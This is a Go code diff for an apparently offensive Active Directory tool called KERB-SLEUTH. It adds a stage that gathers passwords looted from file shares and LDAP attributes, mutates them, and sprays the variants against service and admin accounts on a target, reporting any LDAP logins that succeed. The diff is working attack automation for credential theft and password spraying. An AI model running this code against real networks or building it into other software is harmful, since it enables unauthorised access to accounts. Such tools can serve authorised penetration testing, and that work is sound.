@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/advanced"
+	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/attack"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/ingest"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/output"
@@ -47,12 +48,12 @@ func main() {
 	}
 
 	if *target == "" {
-		util.DisplayBanner("v4.2.0")
+		util.DisplayBanner("v5.0.0")
 		flag.Usage()
 		os.Exit(1)
 	}
 
-	util.DisplayBanner("v4.2.0")
+	util.DisplayBanner("v5.0.0")
 
 	// Initial protocol discovery
 	runProtocolDiscovery(*target)
@@ -217,17 +218,60 @@ func main() {
 		}
 	}
 
-	// ── loot reporting ──────────────────────────────────────────────────
+	// ── loot reporting & offensive spray ─────────────────────────────────
+	var allFoundPasswords []string
 	if results.Advanced.SensitiveFiles != nil {
 		foundLoot := false
 		for _, f := range results.Advanced.SensitiveFiles {
 			if len(f.LootFound) > 0 {
 				if !foundLoot {
-					log.Printf("%s[+] LOOT EXTRACTED FROM SHARES:%s", util.Green, util.Reset)
+					log.Printf("%s[+] LOOT RECOVERY PHASE:%s", util.Green, util.Reset)
 					foundLoot = true
 				}
 				for _, l := range f.LootFound {
 					log.Printf("    %s%s%s → %s", util.Green, f.Path, util.Reset, l)
+					// Extract the password part for spraying
+					parts := strings.Split(l, ": ")
+					if len(parts) > 1 {
+						allFoundPasswords = append(allFoundPasswords, parts[1])
+					}
+				}
+			}
+		}
+	}
+
+	// Add passwords found in LDAP attributes
+	for _, c := range results.Candidates {
+		if c.Type == "LOOT" {
+			for _, r := range c.Reasons {
+				if strings.Contains(r, "LDAP") {
+					parts := strings.Split(r, ": ")
+					if len(parts) > 1 {
+						allFoundPasswords = append(allFoundPasswords, parts[1])
+					}
+				}
+			}
+		}
+	}
+
+	if len(allFoundPasswords) > 0 {
+		log.Printf("%s[*] Starting Offensive Credential Spray & Mutation...%s", util.Cyan, util.Reset)
+		for _, rawPass := range allFoundPasswords {
+			variants := attack.MutatePassword(rawPass)
+			for _, v := range variants {
+				// Test against discovered users
+				for _, u := range users {
+					// To avoid excessive noise, we only test against users with high scores or service accounts
+					if u.SamAccountName != "" && (strings.HasPrefix(u.SamAccountName, "svc") || strings.Contains(u.SamAccountName, "admin")) {
+						results := attack.SprayTest(*target, u.SamAccountName, v, *domain)
+						if len(results) > 0 {
+							for svc := range results {
+								if svc == "LDAP" { // Confirmed valid bind
+									attack.ReportSuccess(u.SamAccountName, v, svc)
+								}
+							}
+						}
+					}
 				}
 			}
 		}
